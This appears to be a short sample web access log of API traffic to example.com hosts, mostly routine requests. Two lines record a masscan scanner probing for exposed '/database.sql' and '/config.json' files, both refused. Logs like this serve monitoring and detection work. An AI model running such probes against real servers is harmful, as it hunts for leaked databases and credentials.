175.101.120.56 - api-client [13/Jun/2026:19:52:12 +0530] "GET /api/v2/search?q=laptop HTTP/1.1" 200 63810 "https://app.example.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.548
162.142.125.24 - - [13/Jun/2026:22:23:56 +0530] "GET /database.sql HTTP/1.1" 403 517 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" rt=0.364
223.226.45.12 - - [13/Jun/2026:22:27:45 +0530] "POST /api/v2/users HTTP/1.1" 200 64718 "https://app.example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.082
72.14.192.10 - api-client [13/Jun/2026:22:31:04 +0530] "POST / HTTP/1.1" 204 565 "https://app.example.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.335
61.246.78.34 - api-client [13/Jun/2026:23:55:42 +0530] "POST /api/v2/users/5678/avatar HTTP/1.1" 204 41 "https://api.example.com/docs" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=1.084
74.125.224.89 - api-client [14/Jun/2026:01:10:27 +0530] "POST /ready HTTP/1.1" 201 36599 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.471
122.177.99.45 - - [14/Jun/2026:01:16:08 +0530] "POST /api/v2/users/profile HTTP/1.1" 200 48131 "https://www.google.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.483
162.142.125.24 - - [14/Jun/2026:03:27:52 +0530] "GET /config.json HTTP/1.1" 404 677 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" rt=0.466
1.186.34.56 - - [14/Jun/2026:04:22:08 +0530] "OPTIONS /api/v2/auth/token HTTP/1.1" 200 17844 "https://dashboard.example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.259
